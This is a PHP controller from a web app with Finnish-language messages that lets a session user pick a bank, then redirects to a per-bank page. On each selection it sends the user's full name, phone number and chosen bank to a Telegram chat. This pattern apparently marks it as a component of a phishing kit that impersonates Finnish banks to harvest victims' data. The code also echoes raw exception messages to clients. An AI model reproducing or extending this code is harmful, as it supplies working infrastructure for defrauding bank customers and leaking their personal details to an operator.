<?php

namespace App\Controllers;

use App\Core\Controller;
use App\Models\Bank;
use App\Models\User;
use App\Models\TelegramService;

class BankController extends Controller
{
    public function index(): void
    {
        if (!isset($_SESSION['user_id'])) {
            $this->redirect('/');
        }

        $bankModel = new Bank();
        $banks = $bankModel->getActive();

        $this->view('bank/index', ['banks' => $banks]);
    }

    public function select(): void
    {
        if (!isset($_SESSION['user_id'])) {
            $this->json([
                'success' => false,
                'message' => 'Istuntoa ei löytynyt.'
            ], 401);
        }

        if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
            $this->json([
                'success' => false,
                'message' => 'Virheellinen pyyntö.'
            ], 400);
        }

        $bankId = (int) ($_POST['bank_id'] ?? 0);
        $userId = $_SESSION['user_id'];

        if ($bankId <= 0) {
            $this->json([
                'success' => false,
                'message' => 'Valitse kelvollinen pankki.'
            ], 400);
        }

        try {
            $bankModel = new Bank();
            $bank = $bankModel->findById($bankId);

            if (!$bank) {
                $this->json([
                    'success' => false,
                    'message' => 'Pankkia ei löytynyt.'
                ], 404);
            }

            $userModel = new User();
            $userModel->updateBankSelection($userId, $bankId);

            $telegram = new TelegramService();
            $user = $userModel->findById($userId);
            if ($user) {
                $telegram->notifyBankSelection(
                    $user['full_name'],
                    $user['phone'],
                    $bank['name']
                );
            }

            $redirectUrl = '/user/' . $userId . '/bank/' . $bankId;

            $this->json([
                'success' => true,
                'message' => 'Pankkivalinta on tallennettu!',
                'redirect' => $redirectUrl
            ]);
        } catch (\Exception $e) {
            $this->json([
                'success' => false,
                'message' => 'Tapahtui virhe: ' . $e->getMessage()
            ], 500);
        }
    }
}

